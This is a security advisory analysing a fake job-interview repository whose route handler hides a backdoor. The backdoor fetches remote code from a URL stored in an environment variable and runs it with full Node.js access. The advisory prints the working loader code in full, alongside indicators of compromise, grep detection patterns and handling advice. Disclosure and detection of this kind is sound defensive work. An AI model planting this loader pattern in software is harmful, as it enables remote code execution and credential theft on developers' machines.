# Runtime RCE Backdoor Hidden in an Environment Variable (Optu-Consulting/Real-Estate-Booking)

**Author:** Trygve Bundgaard — independent security researcher (GitHub: [@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))
**Discovered:** 2026-01-29
**Status:** Identified during pre-run review of a repository delivered as an interview "test"; engagement declined, repo documented and reportable to GitHub Trust & Safety.
**Severity:** Critical — remote code execution with full Node.js `require()` access
**Type:** Social-engineering / fake-interview malware ("Contagious Interview" pattern)

> Indicators below are the code pattern itself; the remote host is hidden in an env var and was not resolved, so there is no live URL to defang.

## Summary

A repository sent as a "Real Estate Booking" interview task contained the same
`Function.constructor('require', …)` remote-code-execution backdoor seen in the
earlier [W3GLFun case](2026-01-27-contagious-interview-w3glfun-rce.md) — but
with a new wrinkle: the command-and-control URL is **hidden in an environment
variable** instead of sitting inline, and the backdoor lives in an application
**route handler** (`getCookie`). This is the same attack class with better concealment.

## Technical analysis

```javascript
// exported route handler — runs at runtime (and as an IIFE on module load)
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const src = atob(process.env.DEV_API_KEY),            // base64 C2 URL from an env var
        x_secret_key = "x-secret-key",
        _sign = "_",
        SessionContent = (await axios.get(src, { headers: { [x_secret_key]: _sign } })).data.cookie,
        handler = new (Function.constructor)('require', SessionContent); // compile remote code
  handler(require);                                      // execute with require() in scope
})();
```

| Element | Purpose |
|---------|---------|
| `atob(process.env.DEV_API_KEY)` | Decodes a base64 C2 URL **hidden in an env var** (no URL in the source) |
| `axios.get(src, { headers: { "x-secret-key": "_" } })` | Fetches the payload, **gated behind a header** so casual requests get nothing |
| `.data.cookie` | Uses the response body as executable code |
| `new (Function.constructor)('require', SessionContent)` | Compiles attacker-controlled text into a function with `require` |
| `handler(require)` | Runs it with full Node.js — filesystem, env, network |
| `})();` | Fires on module load (or when the route is hit) |

### Why the env-var trick matters

A reviewer grepping for `Buffer.from(…, "base64")` or a hardcoded `http` URL
finds nothing — the destination only exists at runtime once `DEV_API_KEY` is
set, and the payload server stays silent unless the request carries the
`x-secret-key: _` header. Static review that stops at `package.json` scripts
(here the only `postinstall` is a benign `prisma generate`) will miss it
entirely; the backdoor is in the app's controller code.

## Indicators of compromise

| Indicator | Value |
|-----------|-------|
| Repository | `github[.]com/Optu-Consulting/Real-Estate-Booking` |
| Code pattern | `new (Function.constructor)('require', <remote>)` fed from `axios.get(atob(process.env.<VAR>))` |
| Env-var C2 | base64 URL stored in an env var (observed: `DEV_API_KEY`) |
| Header gate | `x-secret-key: _` required for the payload host to respond |
| Benign decoy | a legitimate `postinstall: prisma generate` to look normal |

## Impact

RCE with `require()` on the developer's machine — read/write any file, run any
command, steal `.env` secrets, wallet keys, SSH keys, and credentials. Triggers
on module load or when the `getCookie` route is reached.

## Detection

```bash
# the execution primitive, regardless of where the URL comes from
grep -rn "Function.constructor" --include=*.js --include=*.ts --include=*.cjs .
# remote fetch whose URL is decoded from an env var
grep -rn "atob(process.env\|Buffer.from(process.env" --include=*.js --include=*.ts .
# a fetch feeding code straight into execution
grep -rn "axios.get\|fetch(" -A3 --include=*.js --include=*.ts . | grep -n "Function.constructor"
```

## Safe handling

- **Review controllers/route handlers, not just `package.json` scripts** — this family is moving the payload into app code.
- Treat `Function.constructor` / `new Function(...)` fed by any network value as RCE until proven otherwise.
- Analyze untrusted repos in a disposable sandbox with no secrets present and networking off.
- If you already installed/ran it on your host, rotate every credential that machine could reach.

## Campaign context

Same execution technique and fake-interview lure as the W3GLFun npm case,
re-obfuscated — consistent with the "Contagious Interview" activity targeting
developers. Documented here to show the **env-var + header-gated** variant so
reviewers don't rely on finding a hardcoded URL.

---

*Published for the protection of the developer community. — Trygve Bundgaard ([@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))*
